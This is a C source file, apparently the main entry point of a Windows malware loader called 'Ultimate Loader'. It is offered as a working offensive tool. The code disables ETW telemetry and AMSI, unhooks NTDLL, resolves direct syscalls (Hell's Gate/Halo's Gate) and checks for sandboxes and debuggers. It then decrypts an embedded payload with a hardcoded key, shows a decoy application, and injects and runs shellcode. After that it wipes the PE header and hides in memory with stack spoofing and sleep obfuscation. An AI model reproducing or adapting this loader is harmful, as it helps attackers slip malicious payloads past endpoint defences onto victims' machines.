/*
 * Ultimate Loader — Standalone Entry Point
 *
 * Execution chain:
 *   0. Dynamic API resolution (clean IAT)
 *   1. Environmental keying (anti-sandbox, anti-debug, target check)
 *   2. ETW patching (silence telemetry)
 *   3. AMSI bypass
 *   4. NTDLL unhooking (KnownDlls, no disk I/O)
 *   5. Syscall table initialization (Hell's Gate / Halo's Gate)
 *   6. Payload decryption
 *   7. Injection via indirect syscalls
 *   8. PE header stomping
 *   9. Sleep obfuscation loop
 */

#include "common.h"
#include "winapi.h"
#include "env_keying.h"
#include "telemetry.h"
#include "ntdll_unhook.h"
#include "hellsgate.h"
#include "api_hash.h"
#include "crypto.h"
#include "sleep_obf.h"
#include "stackspoof.h"
#include "module_stomp.h"
#include "inject_remote.h"
#include "payload.h"

SYSCALL_TABLE g_Syscalls;

static BOOL InjectShellcode(PBYTE shellcode, SIZE_T sc_size, PVOID *out_base, PSIZE_T out_size) {
    NTSTATUS status;
    PVOID    base_addr = NULL;
    SIZE_T   region_size = sc_size;
    HANDLE   hThread = NULL;

    SetSyscallEntry(g_Syscalls.NtAllocateVirtualMemory.dwSSN,
        g_Syscalls.NtAllocateVirtualMemory.pSyscallAddr);
    status = DoSyscall((HANDLE)-1, &base_addr, 0, &region_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return FALSE;

    SIZE_T bytes_written = 0;
    SetSyscallEntry(g_Syscalls.NtWriteVirtualMemory.dwSSN,
        g_Syscalls.NtWriteVirtualMemory.pSyscallAddr);
    status = DoSyscall((HANDLE)-1, base_addr, shellcode, sc_size, &bytes_written);
    if (!NT_SUCCESS(status)) return FALSE;

    ULONG old_protect;
    SetSyscallEntry(g_Syscalls.NtProtectVirtualMemory.dwSSN,
        g_Syscalls.NtProtectVirtualMemory.pSyscallAddr);
    status = DoSyscall((HANDLE)-1, &base_addr, &region_size, PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(status)) return FALSE;

    *out_base = base_addr;
    *out_size = region_size;

    SetSyscallEntry(g_Syscalls.NtCreateThreadEx.dwSSN,
        g_Syscalls.NtCreateThreadEx.pSyscallAddr);
    status = DoSyscall(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
        base_addr, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
    if (!NT_SUCCESS(status)) return FALSE;

    SetSyscallEntry(g_Syscalls.NtWaitForSingleObject.dwSSN,
        g_Syscalls.NtWaitForSingleObject.pSyscallAddr);
    DoSyscall(hThread, FALSE, NULL);

    SetSyscallEntry(g_Syscalls.NtClose.dwSSN, g_Syscalls.NtClose.pSyscallAddr);
    DoSyscall(hThread);

    return TRUE;
}

int main(void) {
    /* ---- Phase 0: Resolve all Win32 APIs dynamically ---- */
    if (!WinApiInit())
        return 1;

    /* ---- Phase 1: Pre-flight checks ---- */
    if (!CheckEnvironment())
        return 0;

#if ENABLE_ETW_PATCH
    PatchETW();
#endif

#if ENABLE_AMSI_PATCH
    PatchAMSI();
#endif

#if ENABLE_UNHOOK
    UnhookNtdll();
#endif

    if (!InitSyscallTable(&g_Syscalls))
        return 1;

#if ENABLE_STACK_SPOOF
    StackSpoofInit();
#endif

    /* ---- Phase 5: Decrypt payload ---- */
    BYTE key[] = { 0x4D, 0x61, 0x6C, 0x44, 0x65, 0x76 };

#if PAYLOAD_ENTROPY_REDUCED
    SIZE_T real_size = PAYLOAD_ORIGINAL_SIZE;
    PBYTE sc = (PBYTE)g_Api.pVirtualAlloc(NULL, real_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sc) return 1;
    for (SIZE_T i = 0; i < real_size; i++) {
        sc[i] = payload_data[i * 2];
    }
#else
    SIZE_T real_size = payload_size;
    PBYTE sc = (PBYTE)g_Api.pVirtualAlloc(NULL, real_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!sc) return 1;
    memcpy(sc, payload_data, real_size);
#endif

#if USE_RC4
    Rc4(sc, real_size, key, sizeof(key));
#else
    XorCrypt(sc, real_size, key, sizeof(key));
#endif

    /* ---- Phase 5b: Launch decoy application ---- */
#if ENABLE_DECOY
    if (g_Api.pWinExec) {
        char decoy_cmd[] = DECOY_APP;
        g_Api.pWinExec(decoy_cmd, 5); /* SW_SHOW = 5 */
    }
#endif

    /* ---- Phase 6: Inject ---- */
    PVOID  injected_base = NULL;
    SIZE_T injected_size = 0;

#if INJECT_REMOTE
    REMOTE_INJECT_RESULT remote = {0};
    if (!RemoteInject(sc, real_size, REMOTE_PROCESS, &remote)) {
        g_Api.pVirtualFree(sc, 0, MEM_RELEASE);
        return 1;
    }
    injected_base = remote.base_addr;
    injected_size = remote.region_size;
#elif INJECT_MODULE_STOMP
    STOMP_RESULT stomp = {0};
    if (!ModuleStompInject(sc, real_size, &stomp)) {
        g_Api.pVirtualFree(sc, 0, MEM_RELEASE);
        return 1;
    }
    injected_base = stomp.base_addr;
    injected_size = stomp.region_size;
#else
    if (!InjectShellcode(sc, real_size, &injected_base, &injected_size)) {
        g_Api.pVirtualFree(sc, 0, MEM_RELEASE);
        return 1;
    }
#endif

    SecureZeroMemory(sc, real_size);
    g_Api.pVirtualFree(sc, 0, MEM_RELEASE);

    /* ---- Phase 7: PE header stomping ---- */
#if ENABLE_PE_STOMP && !INJECT_MODULE_STOMP
    if (injected_base) {
        DWORD old_protect;
        if (g_Api.pVirtualProtect(injected_base, 0x1000, PAGE_READWRITE, &old_protect)) {
            SecureZeroMemory(injected_base, 0x1000);
            g_Api.pVirtualProtect(injected_base, 0x1000, old_protect, &old_protect);
        }
    }
#endif

    /* ---- Phase 8: Sleep obfuscation loop ---- */
#if ENABLE_SLEEP_OBFUSCATION
    if (injected_base && injected_size > 0) {
        SleepObfuscateInit(injected_base, injected_size);
        while (1) {
#if ENABLE_STACK_SPOOF
            STACK_SPOOF_CTX spoof_ctx;
            SpoofStack(&spoof_ctx);
#endif
            ObfuscatedSleep(30000);
#if ENABLE_STACK_SPOOF
            DespoofStack(&spoof_ctx);
#endif
        }
    }
#endif

    return 0;
}
